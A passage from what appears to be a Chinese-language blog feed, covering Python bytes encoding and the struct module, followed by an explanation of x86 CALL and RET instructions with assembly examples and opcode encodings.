&quot;</span>, b5)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b3:  b&#39;http:&#x2F;&#x2F;c.biancheng.net&#x2F;python&#x2F;&#39;</span><br><span class="line">112</span><br><span class="line">b&#39;c.biancheng.net&#39;</span><br><span class="line">b4:  b&#39;C\xe8\xaf\xad\xe8\xa8\x80\xe4\xb8\xad\xe6\x96\x87\xe7\xbd\x918\xe5\xb2\x81\xe4\xba\x86&#39;</span><br><span class="line">b5:  b&#39;C\xe8\xaf\xad\xe8\xa8\x80\xe4\xb8\xad\xe6\x96\x87\xe7\xbd\x918\xe5\xb2\x81\xe4\xba\x86&#39;</span><br></pre></td></tr></table></figure><h3 id="bytes-decode-方法"><a href="#bytes-decode-方法" class="headerlink" title="bytes.decode()方法"></a>bytes.decode()方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过 encode() 方法将字符串转换成 bytes</span></span><br><span class="line"><span class="built_in">print</span>(b5.decode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b5:  C语言中文网8岁了</span><br></pre></td></tr></table></figure><h3 id="python中字节字符和非字节字符"><a href="#python中字节字符和非字节字符" class="headerlink" title="python中字节字符和非字节字符"></a>python中字节字符和非字节字符</h3><p>python3中默认输入字符串以非字节字符编码，使用unicode字符集表示，可以使用encode方法转化为ascii，utf-8, utf-16等各种编码形式的字节字符；因此仅非字节字符才被python3认为是标准字符串.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.5</span><span class="number">.2</span> (default, Nov <span class="number">23</span> <span class="number">2017</span>, <span class="number">16</span>:<span class="number">37</span>:01)</span><br><span class="line">    [GCC <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>] on linux</span><br><span class="line">    <span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">    &gt;&gt;&gt; uni_str = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line">    &gt;&gt;&gt; <span class="built_in">type</span>(uni_str)</span><br><span class="line">    &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line">    &gt;&gt;&gt; utf8_str = uni_str.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    &gt;&gt;&gt; <span class="built_in">type</span>(utf8_str)</span><br><span class="line">    &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">bytes</span>&#x27;&gt;</span></span><br><span class="line">    &gt;&gt;&gt; asc_str = uni_str.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    &gt;&gt;&gt; <span class="built_in">type</span>(asc_str)</span><br><span class="line">    &lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">bytes</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">    &gt;&gt;&gt; <span class="title">uni_str</span></span></span><br><span class="line"><span class="class">    &#x27;<span class="title">abc</span>&#x27;</span></span><br><span class="line"><span class="class">    &gt;&gt;&gt; <span class="title">utf8_str</span></span></span><br><span class="line"><span class="class">    <span class="title">b</span>&#x27;<span class="title">abc</span>&#x27;</span></span><br><span class="line"><span class="class">    &gt;&gt;&gt; <span class="title">asc</span></span></span><br><span class="line"><span class="class">    <span class="title">asc_str</span>  <span class="title">ascii</span>(<span class="params">   </span></span></span><br><span class="line"><span class="class"><span class="params">    &gt;&gt;&gt; asc_str</span></span></span><br><span class="line"><span class="class"><span class="params">    <span class="string">b&#x27;abc&#x27;</span></span></span></span><br></pre></td></tr></table></figure><p>python2中输入字符串默认使用ascii编码的字节字符，因此默认不支持中文（存疑），可以使用decode方法将默认字节编码的字符串转化为非字节字符，使用unicode字符集表示，进而使用encode方法将unicode字符集的非字节字符转化为其他编码形式的字符如utf-8， utf-16；因此编码后字符串，即字节字符才被python2认为是字符串格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.12</span> (default, Dec  <span class="number">4</span> <span class="number">2017</span>, <span class="number">14</span>:<span class="number">50</span>:<span class="number">18</span>)</span><br><span class="line">   [GCC <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>] on linux2</span><br><span class="line">   <span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">   &gt;&gt;&gt; <span class="built_in">str</span> = <span class="string">&#x27;abc&#x27;</span></span><br><span class="line">   &gt;&gt;&gt; <span class="built_in">type</span>(<span class="built_in">str</span>)</span><br><span class="line">   &lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">   &gt;&gt;&gt; uni_str = <span class="built_in">str</span>.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">   &gt;&gt;&gt; uni_str</span><br><span class="line">   <span class="string">u&#x27;abc&#x27;</span></span><br><span class="line">   &gt;&gt;&gt; <span class="built_in">type</span>(uni_str)</span><br><span class="line">   &lt;<span class="built_in">type</span> <span class="string">&#x27;unicode&#x27;</span>&gt;</span><br><span class="line">   &gt;&gt;&gt; utf8_str = uni_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">   &gt;&gt;&gt; utf8_str</span><br><span class="line">   <span class="string">&#x27;abc&#x27;</span></span><br><span class="line">   &gt;&gt;&gt; <span class="built_in">type</span>(utf8_str)</span><br><span class="line">   &lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="Struct解析二进制数据"><a href="#Struct解析二进制数据" class="headerlink" title="Struct解析二进制数据"></a>Struct解析二进制数据</h2><p>有的时候需要用python处理二进制数据，比如，存取文件，socket操作时.这时候，可以使用python的<code>struct</code>模块来完成.可以用 struct来处理c语言中的结构.</p><p>官方解释是：在Python值和C结构之间转换的函数。Python bytes对象用于保存表示C结构的数据</p><blockquote><p>直白一点，在c语言中c语言包含不同类型的数据(int,char,bool等等)，方便对某一结构对象进行处理。而在网络通信当中，大多传递的数据是以二进制流（binary data）存在的。当传递字符串时，那你就需要有一种机制将某些特定的结构体类型打包成二进制流的字符串然后再网络传输，而接收端也应该可以通过某种机制进行解包还原出原始的结构体数据。python中的struct模块就提供了这样的机制，该模块的主要作用就是对python基本类型值与用python字符串格式表示的C struct类型间的转化，以下原话来自<a href="https://www.cnblogs.com/coser/archive/2011/12/17/2291160.html">https://www.cnblogs.com/coser/archive/2011/12/17/2291160.html</a></p></blockquote><h3 id="格式字符串"><a href="#格式字符串" class="headerlink" title="格式字符串"></a>格式字符串</h3><p>格式字符串是用来在打包和解包数据时指定预期布局的机制。 它们使用指定被打包/解包数据类型的 <a href="https://docs.python.org/zh-cn/3/library/struct.html#format-characters">格式字符</a> 进行构建。 此外，还有一些特殊字符用来控制 <a href="https://docs.python.org/zh-cn/3/library/struct.html#struct-alignment">字节顺序，大小和对齐方式</a>。</p><h3 id="字节顺序，大小和对齐方式"><a href="#字节顺序，大小和对齐方式" class="headerlink" title="字节顺序，大小和对齐方式"></a>字节顺序，大小和对齐方式</h3><p>默认情况下，C类型以机器的本机格式和字节顺序表示，并在必要时通过跳过填充字节进行正确对齐（根据C编译器使用的规则）。</p><p>或者，根据下表，格式字符串的第一个字符可用于指示打包数据的字节顺序，大小和对齐方式：</p><table><thead><tr><th align="left">字符</th><th align="left">字节顺序</th><th align="left">大小</th><th align="left">对齐方式</th></tr></thead><tbody><tr><td align="left"><code>@</code></td><td align="left">按原字节</td><td align="left">按原字节</td><td align="left">按原字节</td></tr><tr><td align="left"><code>=</code></td><td align="left">按原字节</td><td align="left">标准</td><td align="left">无</td></tr><tr><td align="left"><code>&lt;</code></td><td align="left">小端</td><td align="left">标准</td><td align="left">无</td></tr><tr><td align="left"><code>&gt;</code></td><td align="left">大端</td><td align="left">标准</td><td align="left">无</td></tr><tr><td align="left"><code>!</code></td><td align="left">网络（=大端）</td><td align="left">标准</td><td align="left">无</td></tr></tbody></table><p>如果第一个字符不是其中之一，则假定为 <code>&#39;@&#39;</code> 。</p><h3 id="格式字符"><a href="#格式字符" class="headerlink" title="格式字符"></a>格式字符</h3><p>格式字符具有以下含义；C 和 Python 值之间的按其指定类型的转换应当是相当明显的。 <code>标准大小</code>列是指当使用标准大小时以字节表示的已打包值大小；也就是当格式字符串以 <code>&#39;&lt;&#39;</code>, <code>&#39;&gt;&#39;</code>, <code>&#39;!&#39;</code> 或 <code>&#39;=&#39;</code> 之一开头的情况。 当使用本机大小时，已打包值的大小取决于具体的平台。</p><table><thead><tr><th align="left">格式</th><th align="left">C 类型</th><th align="left">Python 类型</th><th align="left">标准大小</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left"><code>x</code></td><td align="left">填充字节</td><td align="left">无</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><code>c</code></td><td align="left">char</td><td align="left">长度为 1 的字节串</td><td align="left">1</td><td align="left"></td></tr><tr><td align="left"><code>b</code></td><td align="left">signed char</td><td align="left">整数</td><td align="left">1</td><td align="left">(1), (2)</td></tr><tr><td align="left"><code>B</code></td><td align="left">unsigned char</td><td align="left">整数</td><td align="left">1</td><td align="left">(2)</td></tr><tr><td align="left"><code>?</code></td><td align="left">_Bool</td><td align="left">bool</td><td align="left">1</td><td align="left">(1)</td></tr><tr><td align="left"><code>h</code></td><td align="left">short</td><td align="left">整数</td><td align="left">2</td><td align="left">(2)</td></tr><tr><td align="left"><code>H</code></td><td align="left">unsigned short</td><td align="left">整数</td><td align="left">2</td><td align="left">(2)</td></tr><tr><td align="left"><code>i</code></td><td align="left">int</td><td align="left">整数</td><td align="left">4</td><td align="left">(2)</td></tr><tr><td align="left"><code>I</code></td><td align="left">unsigned int</td><td align="left">整数</td><td align="left">4</td><td align="left">(2)</td></tr><tr><td align="left"><code>l</code></td><td align="left">long</td><td align="left">整数</td><td align="left">4</td><td align="left">(2)</td></tr><tr><td align="left"><code>L</code></td><td align="left">unsigned long</td><td align="left">整数</td><td align="left">4</td><td align="left">(2)</td></tr><tr><td align="left"><code>q</code></td><td align="left">long long</td><td align="left">整数</td><td align="left">8</td><td align="left">(2)</td></tr><tr><td align="left"><code>Q</code></td><td align="left">unsigned long long</td><td align="left">整数</td><td align="left">8</td><td align="left">(2)</td></tr><tr><td align="left"><code>n</code></td><td align="left"><code>ssize_t</code></td><td align="left">整数</td><td align="left"></td><td align="left">(3)</td></tr><tr><td align="left"><code>N</code></td><td align="left"><code>size_t</code></td><td align="left">整数</td><td align="left"></td><td align="left">(3)</td></tr><tr><td align="left"><code>e</code></td><td align="left">(6)</td><td align="left">float</td><td align="left">2</td><td align="left">(4)</td></tr><tr><td align="left"><code>f</code></td><td align="left">float</td><td align="left">float</td><td align="left">4</td><td align="left">(4)</td></tr><tr><td align="left"><code>d</code></td><td align="left">double</td><td align="left">float</td><td align="left">8</td><td align="left">(4)</td></tr><tr><td align="left"><code>s</code></td><td align="left">char[]</td><td align="left">字节串</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><code>p</code></td><td align="left">char[]</td><td align="left">字节串</td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><code>P</code></td><td align="left">void*</td><td align="left">整数</td><td align="left"></td><td align="left">(5)</td></tr></tbody></table><p>格式字符之前可以带有整数重复计数。 例如，格式字符串 <code>&#39;4h&#39;</code> 的含义与 <code>&#39;hhhh&#39;</code> 完全相同。</p><p>格式之间的空白字符会被忽略；但是计数及其格式字符中不可有空白字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">10s 表示<span class="number">10</span>个字节的字节串</span><br><span class="line">10c 表示<span class="number">10</span>个字符</span><br><span class="line">0s  表示空字符串</span><br><span class="line">0c  表示<span class="number">0</span>个字符</span><br></pre></td></tr></table></figure><h3 id="Example：-三个整数"><a href="#Example：-三个整数" class="headerlink" title="Example：(三个整数)"></a>Example：(三个整数)</h3><p>打包/解包三个整数的基础示例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">pack_data = pack(<span class="string">&#x27;hhl&#x27;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="comment">#打包两个short类型一个long类型的数值,即0x00 0x01|0x00 0x02|0x00 0x00 0x00 0x03</span></span><br><span class="line"><span class="built_in">print</span>(pack_data)</span><br></pre></td></tr></table></figure><p>在C语言中一个<code>short</code>占用2个字节即<code>word</code>，一个<code>long</code>占用4个字节即<code>dword</code>，</p><p>可以看到我当前系统上他以小端格式输出了如下的数据。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211015204833562-634936884.png" alt="image-20211015204833589"> </p><p>如果需要转成大端格式比较可视化，只要在改成这种格式<code>&gt;hhl</code>即可。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211015205255730-1875819416.png" alt="image-20211015205256133"> </p><p>接下来是解包，我们从文件或网络得到C格式的字节流后需要转成对应的python数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">unpack_data = struct.unpack(<span class="string">&#x27;hhl&#x27;</span>,<span class="string">b&#x27;\x00\x01\x00\x02\x00\x00\x00\x03&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(unpack_data)</span><br></pre></td></tr></table></figure><p>执行后发现数据对不上，如下图：</p><p>这是因为他默认以小端的方式去解包了，所以刚好对应的十进制数据就是256.</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211015205831267-367274415.png" alt="image-20211015205831580"> </p><p>所以在解包的时候我们必须要明确解包的顺序，是大端还是小端，这里我们需要解成大端的格式即<code>&gt;hhl</code></p><p> <img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211015210133959-1075960923.png" alt="image-20211015210134355"> </p><h3 id="Example-（元组）"><a href="#Example-（元组）" class="headerlink" title="Example:（元组）"></a>Example:（元组）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">record = <span class="string">b&#x27;raymond   \x32\x12\x08\x01\x08&#x27;</span></span><br><span class="line">name, serialnum, school, gradelevel = unpack(<span class="string">&#x27;&lt;10sHHb&#x27;</span>, record)</span><br><span class="line"><span class="comment">#小端模式</span></span><br><span class="line"><span class="comment">#10s 长度10的字节串</span></span><br><span class="line"><span class="comment">#unsigned short</span></span><br><span class="line"><span class="comment">#unsigned short</span></span><br><span class="line"><span class="comment">#一个字节</span></span><br></pre></td></tr></table></figure><h3 id="Example：（填充）"><a href="#Example：（填充）" class="headerlink" title="Example：（填充）"></a>Example：（填充）</h3><p>以下格式 <code>&#39;llh0l&#39;</code> 指定在末尾有两个填充字节，假定 long 类型按 4 个字节的边界对齐:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pack(<span class="string">&#x27;llh0l&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="string">b&#x27;\x00\x00\x00\x01\x00\x00\x00\x02\x00\x03\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>参考文献：</p><p>《Python编程从入门到实践》<br><a href="http://c.biancheng.net/view/2175.html">http://c.biancheng.net/view/2175.html</a> [Python bytes类型及用法]<br><a href="https://www.cnblogs.com/blili/p/11798504.html#%E7%BB%BC%E8%BF%B0python%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E4%B8%BA%E5%AD%97%E8%8A%82%E5%AD%97%E7%AC%A6%E5%92%8C%E9%9D%9E%E5%AD%97%E8%8A%82%E5%AD%97%E7%AC%A6">https://www.cnblogs.com/blili/p/11798504.html#%E7%BB%BC%E8%BF%B0python%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E4%B8%BA%E5%AD%97%E8%8A%82%E5%AD%97%E7%AC%A6%E5%92%8C%E9%9D%9E%E5%AD%97%E8%8A%82%E5%AD%97%E7%AC%A6</a> [python字符串的encode与decode]<br><a href="https://docs.python.org/zh-cn/3/library/struct.html#format-strings">https://docs.python.org/zh-cn/3/library/struct.html#format-strings</a> [struct — 将字节串解读为打包的二进制数据]</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;

&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;由于有其他高级语言的开发经验</summary>
      
    
    
    
    <category term="编程开发" scheme="https://vxer-lee.github.io/categories/programing/"/>
    
    
    <category term="Python" scheme="https://vxer-lee.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CALL指令详解</title>
    <link href="https://vxer-lee.github.io/2021/09/22/DoSASM/CallDetail/"/>
    <id>https://vxer-lee.github.io/2021/09/22/DoSASM/CallDetail/</id>
    <published>2021-09-22T11:18:01.000Z</published>
    <updated>2021-09-22T11:43:45.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="call和ret指令概述："><a href="#call和ret指令概述：" class="headerlink" title="call和ret指令概述："></a>call和ret指令概述：</h2><p><code>call</code>和<code>ret</code>指令都是转移指令，它们都修改IP，或同时修改CS和IP。他们经常被用来实现子程序(函数)的设计。</p><h2 id="ret和retf"><a href="#ret和retf" class="headerlink" title="ret和retf"></a>ret和retf</h2><h3 id="ret指令"><a href="#ret指令" class="headerlink" title="ret指令"></a>ret指令</h3><p><code>ret</code>指令：用栈中的数据，修改IP的内容，从而实现(<code>近转移</code>)；<br>CPU执行ret指令时，需要进行下面两个步骤：</p><p>相当于：<code>pop IP</code></p><ul><li>(1) (IP) = ((ss)*16+(sp))</li><li>(2) (SP)=(sp)+2<h3 id="retf指令"><a href="#retf指令" class="headerlink" title="retf指令"></a>retf指令</h3><code>retf</code>指令：用栈中的数据，修改CS和IP的内容，从而实现(``远转移`)。</li></ul><p>CPU执行retf指令时，需要进行下面四个步骤</p><p>相当于：<code>pop CS,pop IP</code></p><ul><li>(1) (IP) = ((ss)*16+(sp))</li><li>(2) (SP) = (sp)+2</li><li>(3) (CS) = ((ss)*16+(sp))</li><li>(4) (SP) = (sp)+2  </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">;************************************</span><br><span class="line">;            ret指令实验             *          </span><br><span class="line">;************************************</span><br><span class="line">assume cs:code,ss:stack</span><br><span class="line"></span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">;堆栈段</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">stack segment</span><br><span class="line">db 16 dup(0)</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">;代码段</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">code segment</span><br><span class="line">  mov ax,4c00h</span><br><span class="line">  int 21h;退出到DOS</span><br><span class="line">main:;程序入口</span><br><span class="line">    mov ax,stack</span><br><span class="line">    mov ss,ax   ;关联堆栈段</span><br><span class="line">    mov sp,16   ;设置栈顶</span><br><span class="line">    mov ax,0</span><br><span class="line">    push ax     ;压栈</span><br><span class="line">      ret         ;pop ip, -&gt;cs:ip cs:0 ,让程序跳到入口处上面</span><br><span class="line">code ends</span><br><span class="line">end main</span><br></pre></td></tr></table></figure><h3 id="call-和-ret-的配合使用"><a href="#call-和-ret-的配合使用" class="headerlink" title="call 和 ret 的配合使用"></a>call 和 ret 的配合使用</h3><p>call 与 ret 指令共同支持了汇编语言编程中的模块化设计</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210922191210226-1672149662.png" alt="image-20210922191207275"> </p><h2 id="call指令详解"><a href="#call指令详解" class="headerlink" title="call指令详解"></a>call指令详解</h2><p>在X86架构下：call基本都是调用一个函数,比如调用<code>MessageBox</code>，在汇编中就会写成<code>Call MessageBox</code>，并且<code>call</code>经常和<code>ret</code>搭配使用，下面我们来说说call的原理。</p><h3 id="call原理"><a href="#call原理" class="headerlink" title="call原理"></a>call原理</h3><p>CPU执行call指令时，会进行如下两个步骤：</p><ul><li>(1) 将当前的IP或者CS:IP压入栈中；</li><li>(2) 转移指令(jmp)</li></ul><p>我们这里先来看看<code>x86</code>架构下EXE执行call的流程。</p><ol><li>用<code>x32dbg</code>打开<code>HelloWorld.exe</code>，然后反汇编视图如下：<br>此时我们还没执行Call，然后我们先记一下Call下条指令的地址<code>0x0040107C</code>，然后接着第2步骤按<code>F7</code>进入到call内部，然后此时注意观察堆栈的信息。</li></ol><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210921185015534-846887787.png" alt="image-20210921185014473"> </p><ol start="2"><li>我们按<code>F7</code>进入到call内容。<br>第一步里面我们记下来的<code>0x0040107C</code>地址，被push到了堆栈里面，并且<code>jmp</code>到了函数的地址<code>00401000</code>，所以验证了之前CPU执行call指令会有两个步骤(push ip，并且jmp 到call 函数的地址)。</li></ol><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210921185802601-1064316223.png" alt="image-20210921185801800"> </p><h3 id="call指令所有写法"><a href="#call指令所有写法" class="headerlink" title="call指令所有写法"></a>call指令所有写法</h3><p><code>8086</code>CPU架构中：</p><ul><li>call 标号（近转移）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure><ul><li>call far ptr 标号（段间转移）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push cs</span><br><span class="line">push ip</span><br><span class="line">jmp fat ptr 标号</span><br></pre></td></tr></table></figure><ul><li>call 16位寄存器</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp ax</span><br></pre></td></tr></table></figure><ul><li>call word ptr 内存单元地址</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 0123h</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">call word ptr ds:[0]</span><br><span class="line">;等于</span><br><span class="line">push ip</span><br><span class="line">jmp word ptr ds:[0]</span><br></pre></td></tr></table></figure><ul><li>call dword ptr 内存单元地址</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">call dword ptr ds:[0]</span><br><span class="line">;等于 cs:ip 0:0123h</span><br><span class="line">push cs</span><br><span class="line">push ip</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure><p><code>X86</code>CPU架构中：</p><p>先来看一张<code>Intel X86架构手册</code>的图片。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210922110351902-799470557.png" alt="CALL指令有多少种写法"> </p><ul><li><p>E8 cw(w表示word的意思|代表后面要跟两个字节)   - 近转移 位移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!注意! CPU在实模式下，0xE8才接受2字节操作数</span><br><span class="line">0xE8 0x04 0x00  call 标号 偏移:0x04</span><br></pre></td></tr></table></figure></li><li><p>E8 cd(d表示dword的意思)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在保护式下，0xE8接受4字节操作数</span><br><span class="line">0xE8 0x04 0x03 0x02 0x01  call 偏移:0x01234</span><br></pre></td></tr></table></figure></li><li><p>FF /2 (r/m32)<br>FF /2，是 0xFF 后面跟着一个 /digit 表示的东西。如下图 2 对应的就是DL带头的那一列，标红的这32个值代表了32种寻址方式。</p></li></ul><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210922165550633-717733755.jpg" alt="img"> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;call的是取寄存器地址的值</span><br><span class="line">FF 10 call dword ptr [eax]</span><br><span class="line">FF 11 call dword ptr [ecx]</span><br><span class="line">FF 12 call dword ptr [edx]</span><br><span class="line">FF 13 call dword ptr [ebx]</span><br><span class="line">;call的是寄存器的值</span><br><span class="line">FF D0 call eax</span><br><span class="line">FF D1 call ecx</span><br><span class="line">FF D2 call edx </span><br><span class="line">FF D3 call ebx</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210922170402346-103598367.png" alt="image-20210922170402158"> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FF 15 [地址] 常见于调用Windows的导出表比如:</span><br><span class="line">call dword ptr ds:[&lt;&amp;CreateFileA&gt;]</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210922182431178-692842958.png" alt="image-20210922182431058"> </p><ul><li>FF /2 (r/m64)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同32位，只是寄存器和地址都是64位的</span><br></pre></td></tr></table></figure><ul><li>9A cd(d表示dword的意思)  – call far ptr 标号(段间转移)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">类似8086中的call far ptr</span><br><span class="line">9A xx xx xx xx xx xx</span><br><span class="line">其中最后两个xx xx 